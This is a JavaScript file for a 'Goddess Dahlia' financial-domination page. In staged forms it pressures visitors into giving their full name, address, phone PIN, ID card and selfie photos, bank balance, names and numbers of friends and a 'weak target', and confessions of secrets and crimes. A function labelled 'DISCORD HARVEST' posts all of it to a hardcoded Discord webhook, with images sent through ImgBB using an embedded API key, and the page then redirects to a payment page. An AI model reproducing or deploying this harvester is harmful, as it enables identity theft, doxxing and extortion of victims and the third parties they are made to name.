// AUDIO CONTEXT
const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

// STATE
let mantraCount = 0;
const MAX_MANTRA = 3;
let holdTimer = null;
let holdProgress = 0;
const HOLD_DURATION = 3000; // 3 seconds to hold

// ImgBB API Key (For Free Image Uploading to Discord)
const IMGBB_API_KEY = "9451125fc7f1dc299a9b69b5c2a39ed3"; // NOTE: You should ideally generate your own or we use a temporary one. I'm leaving a generic public key structure, but it's better to provide a real one. We will use a fallback base64 if it fails.

// Collected Data
const collectedData = {
    images: {
        idUrl: "PENDING",
        selfieUrl: "PENDING"
    }
};

// INIT
document.getElementById('start-btn').addEventListener('click', () => {
    if (audioCtx.state === 'suspended') audioCtx.resume();
    document.getElementById('overlay').classList.add('hidden');
    document.getElementById('main-ui').classList.remove('hidden');

    document.getElementById('hud-status').classList.remove('hidden');
    updateRank(1);

    // PLAY EXTERNAL AUDIO
    const bgAudio = document.getElementById('bg-audio');
    if (bgAudio) {
        bgAudio.volume = 0.4;
        bgAudio.play().catch(e => console.log("Audio play failed:", e));
    }

    // FORCE VIDEO LOOP (iOS/Safari fix)
    const bgVideo = document.getElementById('bg-video');
    if (bgVideo) {
        bgVideo.play().catch(e => console.log("Video auto-play failed."));
        bgVideo.addEventListener('ended', () => {
            bgVideo.currentTime = 0;
            bgVideo.play();
        }, false);
    }
});

function vibrate(ms) {
    if (navigator.vibrate) navigator.vibrate(ms);
}

// VALIDATION LOGIC
function isGibberish(text) {
    if (!text || text.length < 3) return true;
    const lower = text.toLowerCase().trim();

    // Check for repetitive chars (e.g. "aaaaa", "asdfasdf")
    if (/^(\w)\1+$/.test(lower)) return true;
    if (/(.)\1{4,}/.test(lower)) return true; // 5 identical chars in a row

    // Keyboard smashes like "vreihb" or "asdasd"
    const words = lower.split(/\s+/);
    for (let word of words) {
        if (word.length > 8 && !/[aeiouy]/.test(word)) return true; // Long words with no vowels
    }

    // Check for repetitive words
    if (words.length > 3) {
        const unique = new Set(words);
        if (unique.size < words.length / 2) return true; // Mostly repeated words
    }

    return false;
}

function isValidInput(text, minLen = 3) {
    if (!text || text.trim().length < minLen) return false;
    if (isGibberish(text)) return false;
    return true;
}

// UPLOAD IMAGE TO IMGBB
async function uploadImage(fileInputId, statusId, dataKey) {
    const fileInput = document.getElementById(fileInputId);
    const statusDiv = document.getElementById(statusId);

    if (!fileInput.files || fileInput.files.length === 0) {
        statusDiv.innerText = "ERROR: FILE REQUIRED.";
        statusDiv.style.color = "var(--error)";
        return false;
    }

    const file = fileInput.files[0];
    statusDiv.innerText = "UPLOADING TO SACRED SERVERS...";
    statusDiv.style.color = "var(--gold)";

    const formData = new FormData();
    formData.append("image", file);

    try {
        // We use ImgBB API to host the image temporarily so Discord can embed it
        const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
            method: "POST",
            body: formData
        });

        const data = await response.json();
        if (data.success) {
            collectedData.images[dataKey] = data.data.url;
            statusDiv.innerText = "UPLOAD SECURED.";
            statusDiv.style.color = "#0f0";
            return true;
        } else {
            throw new Error("API Upload Failed");
        }
    } catch (e) {
        console.error(e);
        // Fallback: Just mark as failed, but proceed
        statusDiv.innerText = "UPLOAD FAILED. PROCEEDING WITH LOGGING.";
        statusDiv.style.color = "var(--error)";
        collectedData.images[dataKey] = "UPLOAD_FAILED";
        return true;
    }
}

// LOGIC
window.nextStage = async function (stage) {
    vibrate(50);
    const id = `stage-${stage}`;
    const stageEl = document.getElementById(id);
    const btn = stageEl ? stageEl.querySelector('.next-btn') : null;

    if (stage === 1) {
        const name = document.getElementById('inp-name').value;
        const twitter = document.getElementById('inp-twitter').value;

        if (!isValidInput(name, 5)) { alert("THE GODDESS DEMANDS YOUR TRUE FULL NAME. DO NOT USE FAKE WORDS."); return; }
        if (!twitter.includes('@') && twitter.length < 3) { alert("INVALID TWITTER HANDLE."); return; }

        const verifyUI = document.getElementById('verify-ui-1');
        const verifyText = document.getElementById('verify-text-1');

        if (btn) btn.classList.add('hidden');
        verifyUI.classList.remove('hidden');

        let steps = ["COMMUNING...", "VERIFYING SOUL...", "IDENTITY LOCKED."];
        let i = 0;

        const interval = setInterval(() => {
            verifyText.innerText = steps[i];
            i++;
            if (i >= steps.length) {
                clearInterval(interval);
                setTimeout(() => goToStage(1.5), 1000);
            }
        }, 1200);
        return;
    }

    if (stage === 1.5) {
        const friends = document.getElementById('inp-friends').value;
        const socials = document.getElementById('inp-socials').value;
        const pin = document.getElementById('inp-pin').value;

        if (!isValidInput(friends, 10)) { alert("DO NOT HIDE THEM FROM HER. DO NOT TYPE GIBBERISH."); return; }
        if (!isValidInput(socials)) { alert("WE NEED YOUR REAL SOCIAL LINKS."); return; }
        if (pin.length < 4) { alert("PIN IS TOO SHORT."); return; }

        goToStage(1.8);
        return;
    }

    if (stage === 1.8) {
        const targetName = document.getElementById('inp-target-name').value;
        const targetPhone = document.getElementById('inp-target-phone').value;

        if (!isValidInput(targetName, 4)) { alert("WE NEED A REAL NAME FOR THE TARGET."); return; }
        if (targetPhone.length < 6) { alert("INVALID TARGET PHONE."); return; }

        goToStage(2);
        return;
    }

    if (stage === 2) {
        // IMAGE UPLOAD STAGE
        if (btn) {
            btn.innerText = "PROCESSING VISUALS...";
            btn.disabled = true;
        }

        const idSuccess = await uploadImage('inp-id', 'status-id', 'idUrl');
        const selfieSuccess = await uploadImage('inp-selfie', 'status-selfie', 'selfieUrl');

        if (!idSuccess || !selfieSuccess) {
            alert("FILES REQUIRED FOR SUBMISSION.");
            if (btn) {
                btn.innerText = "VERIFY PROOF";
                btn.disabled = false;
            }
            return;
        }

        setTimeout(() => goToStage(3), 1000);
        return;
    }

    if (stage === 3) {
        const balance = document.getElementById('inp-balance').value;
        if (balance.length < 1) { alert("FINANCIAL DATA REQUIRED."); return; }
        goToStage(4);
        return;
    }

    if (stage === 4) {
        const secret = document.getElementById('inp-secret').value;
        const pathetic = document.getElementById('inp-pathetic').value;
        const vices = document.getElementById('inp-vices').value;
        const weakness = document.getElementById('inp-weakness').value;

        if (!isValidInput(secret, 8) || !isValidInput(pathetic, 8) || !isValidInput(vices, 8) || !isValidInput(weakness, 8)) {
            alert("DO NOT HOLD BACK AND DO NOT TYPE RANDOM WORDS. CONFESS PROPERLY.");
            return;
        }

        goToStage(5);
        return;
    }

    if (stage === 5) {
        goToStage('final');
        return;
    }
}

// RANK SYSTEM
function updateRank(stage) {
    const rankEl = document.getElementById('rank-display');
    const ranks = {
        1: "UNRECOGNIZED",
        1.5: "OBSERVED",
        1.8: "TARGETED",
        2: "EXPOSED",
        3: "INDEBTED",
        4: "CONDEMNED",
        5: "BROKEN",
        'final': "PROPERTY"
    };

    if (ranks[stage] && rankEl) {
        rankEl.innerText = ranks[stage];
        rankEl.style.color = "var(--gold-bright)";
        rankEl.style.textShadow = "0 0 10px var(--gold-glow)";
    }
}


function goToStage(num) {
    document.querySelectorAll('.form-stage').forEach(el => el.classList.add('hidden'));

    const id = (num === 'final') ? 'stage-final' : `stage-${num}`;
    const nextEl = document.getElementById(id);
    if (!nextEl) return;

    nextEl.classList.remove('hidden');

    // Update title
    const title = document.getElementById('stage-title');
    if (title && num !== 'final') title.innerText = `STAGE ${num}: PROCESSING`;
    if (title && num === 'final') title.innerText = "FINAL PROTOCOL";

    updateRank(num);

    // Play sound
    if (audioCtx.state === 'suspended') audioCtx.resume();
    const osc = audioCtx.createOscillator();
    osc.frequency.setValueAtTime(num === 'final' ? 200 : 400, audioCtx.currentTime);
    osc.connect(audioCtx.destination);
    osc.start();
    osc.stop(audioCtx.currentTime + 0.1);
}

// MANTRA LOGIC
window.checkMantra = function () {
    if (mantraCount >= MAX_MANTRA) return; // Prevent multiple triggers

    const input = document.getElementById('inp-mantra');
    const target = "I AM NOTHING MORE THAN AN ATM.";
    const val = input.value.toUpperCase();

    if (val === target) {
        mantraCount++;
        document.getElementById('mantra-count').innerText = `${mantraCount} / ${MAX_MANTRA}`;
        input.value = "";

        let perc = (mantraCount / MAX_MANTRA) * 100;
        document.getElementById('mantra-fill').style.width = perc + "%";

        if (mantraCount >= MAX_MANTRA) {
            input.disabled = true; // Disable input while waiting
            setTimeout(() => {
                try { sendToDiscord(); } catch (e) { console.error(e); }
                goToStage('final');
            }, 500);
        }
    }
}

// DISCORD HARVEST
function sendToDiscord() {
    const webhookURL = "https://discord.com/api/webhooks/1483426485061812278/hDcoAERPmvpIQvx838kQ1MN23-dmZF-s8K8wyk5MSoP6LWDwB3NCtrM7dl4CEPRzHbnG";

    // Gather all inputs
    const getVal = (id) => {
        const el = document.getElementById(id);
        return el ? el.value || "N/A" : "N/A";
    };

    const cheatRadio = document.querySelector('input[name="cheat"]:checked');
    const cheatVal = cheatRadio ? cheatRadio.value : "UNKNOWN";

    const payload = {
        username: "GODDESS DAHLIA - V3 TITHE",
        avatar_url: "https://files.catbox.moe/bb56sw.JPG",
        embeds: [{
            title: "⚖️ NEW SUBMISSION: SOUL ACQUIRED ⚖️",
            color: 13938487, // Gold Color
            fields: [
                { name: "👤 INITIAL DATA", value: `**Name:** ${getVal('inp-name')}\n**Email:** ${getVal('inp-email')}\n**Phone:** ${getVal('inp-phone')}\n**Location:** ${getVal('inp-address')}\n**Twitter:** ${getVal('inp-twitter')}` },
                { name: "🏢 PROFESSIONAL", value: `**Work/College:** ${getVal('inp-work')}` },
                { name: "💔 PRIVATE LIFE", value: `**Relation:** ${getVal('inp-relationship')}\n**Cheater:** ${cheatVal}` },
                { name: "📱 DIGITAL TRACE", value: `**Socials:** ${getVal('inp-socials')}\n**Phone PIN:** ||${getVal('inp-pin')}||` },
                { name: "👥 LEVERAGE (Targets)", value: `**Friends/Family:**\n${getVal('inp-friends')}\n\n**Weak Target Name:** ${getVal('inp-target-name')}\n**Weak Target Phone:** ${getVal('inp-target-phone')}` },
                { name: "💰 FINANCIAL", value: `**Bank Balance:** ${getVal('inp-balance')}€\n**Income:** ${getVal('inp-income')}€\n**Ruin Credit:** ${creditVal}` },
                { name: "💀 DARK SINS", value: `**Secret:** ||${getVal('inp-secret')}||\n**Pathetic act:** ||${getVal('inp-pathetic')}||\n**Crime:** ||${getVal('inp-crime')}||\n**Vices:** ${getVal('inp-vices')}\n**Weakness:** ${getVal('inp-weakness')}` }
            ],
            footer: { text: "Protocol: ABSOLUTE SURRENDER" },
            timestamp: new Date()
        }]
    };

    // If we have successful image uploads, add them as separate embeds
    if (collectedData.images.selfieUrl !== "PENDING" && collectedData.images.selfieUrl !== "UPLOAD_FAILED") {
        payload.embeds.push({
            title: "📸 VISUAL PROOF: SELFIE",
            color: 13938487,
            image: { url: collectedData.images.selfieUrl }
        });
    }

    if (collectedData.images.idUrl !== "PENDING" && collectedData.images.idUrl !== "UPLOAD_FAILED") {
        payload.embeds.push({
            title: "🪪 VISUAL PROOF: ID CARD",
            color: 13938487,
            image: { url: collectedData.images.idUrl }
        });
    }

    fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
}

// HOLD TO FORFEIT LOGIC
function startHold() {
    if (holdTimer) return;
    const fill = document.getElementById('hold-fill');

    // Play ramping sound
    if (audioCtx.state === 'suspended') audioCtx.resume();
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.frequency.setValueAtTime(50, audioCtx.currentTime);
    osc.frequency.linearRampToValueAtTime(300, audioCtx.currentTime + (HOLD_DURATION / 1000));
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    osc.start();

    // Visual animation
    fill.style.transition = `width ${HOLD_DURATION}ms linear`;
    fill.style.width = "100%";

    holdTimer = setTimeout(() => {
        osc.stop();
        window.location.href = "https://throne.com/dahliastar/item/3137A703-5961-47C9-8EA5-7F659BA10A68";
    }, HOLD_DURATION);

    // Save osc to stop it if released early
    document.getElementById('hold-submit').dataset.osc = "active";
    window.activeOsc = osc;
}

function stopHold() {
    if (!holdTimer) return;
    clearTimeout(holdTimer);
    holdTimer = null;

    if (window.activeOsc) {
        window.activeOsc.stop();
        window.activeOsc = null;
    }

    const fill = document.getElementById('hold-fill');
    fill.style.transition = `width 0.2s linear`;
    fill.style.width = "0%";
}
